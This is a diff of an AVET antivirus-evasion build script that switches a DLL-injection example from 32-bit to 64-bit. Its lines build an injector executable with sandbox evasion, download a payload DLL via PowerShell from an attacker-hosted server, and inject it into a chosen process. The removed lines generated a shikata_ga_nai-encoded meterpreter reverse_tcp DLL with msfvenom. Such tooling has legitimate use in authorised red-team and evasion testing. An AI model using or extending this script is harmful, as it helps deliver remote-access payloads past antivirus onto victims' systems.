@@ -1,21 +1,25 @@
 #!/bin/bash
-# Dll injection 32-bit example build script
+# Dll injection 64-bit example build script
 # Creates an executable that injects a dll residing on the target's disk into a target process
-# Also creates a meterpreter dll payload and downloads the file via powershell onto the target's disk for injection
+# Also creates an exec_calc 64-bit dll payload , and downloads the file via powershell onto the target's disk for injection
 # Target process and dll can be specified in the third(!) command line argument as format:		pid,dll_path
 
-# Host the generated metasploit dll payload via HTTP on port 80
+# Host the generated dll payload via HTTP on port 80
 # Call the injector executable like:
-# output.exe http://yourserver/thepayload.dll random target_pid,thepayload.dll
+# output.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
 # "random" just fills argv[2], which is not needed here
+
+# The download mechanism, as deployed here, is kind of a workaround to deliver the payload to the target.
+# download_powershell is "abused" as payload source, so the file is downloaded and read into memory, but that buffer is not used to deliver the dll.
+# Instead, the dll is read from disk (again) by the inject_dll payload execution method, and injected into the target process specified in payload_info.
 
 # print AVET logo
 cat banner.txt
 
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
+# include script containing the compiler var $win64_compiler
+# you can edit the compiler in build/global_win64.sh
+# or enter $win64_compiler="mycompiler" here
+. build/global_win64.sh
 
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
@@ -27,8 +31,9 @@ LHOST=$GLOBAL_LHOST
 # import feature construction interface
 . build/feature_construction.sh
 
-# generate meterpreter reverse tcp payload as dll, which can then be served via HTTP for the dropped executable to download
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f dll -a x86 --platform Windows > output/thepayload.dll
+# compile exec_calc 64-bit dll payload from source
+# the idea was to generate a meterpreter dll payload here via msfvenom, but somehow the meterpreter dll appears to be non-injectible
+$win64_compiler test_payloads/exec_calc.c -shared -o output/exec_calc64.dll
 
 # add evasion techniques
 add_evasion fopen_sandbox_evasion
@@ -54,7 +59,7 @@ set_payload_execution_method inject_dll
 enable_debug_print
 
 # compile 
-$win32_compiler -o output/output.exe source/avet.c -lws2_32
+$win64_compiler -o output/output.exe source/avet.c -lws2_32
 strip output/output.exe
 
 # cleanup
